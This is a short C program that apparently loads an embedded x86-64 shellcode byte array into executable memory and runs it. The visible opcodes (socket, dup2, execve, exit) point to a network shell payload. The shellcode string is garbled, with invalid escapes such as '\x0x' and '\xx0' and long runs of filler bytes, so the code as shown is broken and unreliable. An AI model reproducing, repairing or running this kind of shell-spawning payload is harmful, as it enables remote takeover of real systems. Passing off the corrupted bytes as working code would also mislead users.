#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x48\x29\xc0\x48\x31\xdb\x48\x29\xc9\x48\x29\xd2\x48\x31\xff\x48\xc1\xee\x10\x48\x31\xf6\xb0\x29\xb3\x02\x48\x89\xdf\x80\xc3\x01\x48\x89\xde\x0f\x05\x0x\x0x\x2x\xcx\x51\xfa\x3e\x2x\x54\x3f\xe2\x54\x1x\x76\x36\x02\xa1\x56\x36\x35\xbe\x08\xbb\x05\x8d\x62\x54\x72\x1x\xdb\xe2\x54\x4d\x68\x94\x75\xe3\xd4\xx0\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\xbe\x38\x84\x48\x31\xc0\xb0\x3f\x4c\x89\xd7\x48\xc1\xee\x10\x0f\x05\xb0\x3f\x4c\x89\xd7\x48\xff\xc6\x0f\x05\xb0\x3f\x4c\x89\xd7\x48\xff\xc6\x0f\x05\x48\x29\xc0\x48\x31\xd2\x48\xbb\xc3\xc3\xf6\x67\xb7\xc3\x08\x57\xx0\x48\x83\xc3\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x29\xc0\x48\x31\xd2\xb0\x3c\x4c\x89\xd7\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
